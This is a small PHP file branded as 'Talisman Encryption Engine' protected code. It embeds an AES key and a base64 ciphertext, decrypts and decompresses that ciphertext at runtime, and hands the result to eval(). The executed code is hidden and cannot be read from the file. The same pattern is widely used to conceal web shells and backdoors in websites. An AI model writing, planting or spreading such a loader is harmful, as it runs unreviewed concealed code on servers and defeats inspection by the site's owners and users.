<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k6a206 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p6990a = base64_decode('tgqSLrTK5m0iBjNjS/dErG1FKzN3UVVxQnpyMFFzTXp6YVB0SFlTM0tuWXlkdXdQYWp0K05tTDJUZjRkYXRFMmxjdzlNYTJuK3FmTkxvVHp5Uk5pVU4wU0I1U3JYTHBjWG4vaVRjR3hBdkc3cmV0eDgyWGdLVUd2NmhFQnk0WTAzN0lHemlOWHNaMG9wZVVOT0hSbTV1T01lMERjcHZhYWpTWElTMHZheXFXWlQ1czVFVTZLV2pYMWdXSWxTQ2txNHNQK2ZERDgzd3NCYVE2Rzd6UUtTL0x4Mzk2cmlOVGYyaXIzOFRrWUdWNW1XdmpSdE5CL05pSjhtSnVBSjR0a2lWa1lobm1CRTRKOHk4Z3NEejJnQnVOQkNEMXJjekVrZDh6R0M3WVUrNDJuTzFTeUFIcU5ITnJkWEo4PQ==');
$i9cebd = openssl_cipher_iv_length('aes-256-cbc');
$v0fa95 = substr($p6990a, 0, $i9cebd);
$cf669a = substr($p6990a, $i9cebd);
eval('?>'.gzinflate(openssl_decrypt($cf669a, 'aes-256-cbc', $k6a206, 0, $v0fa95)));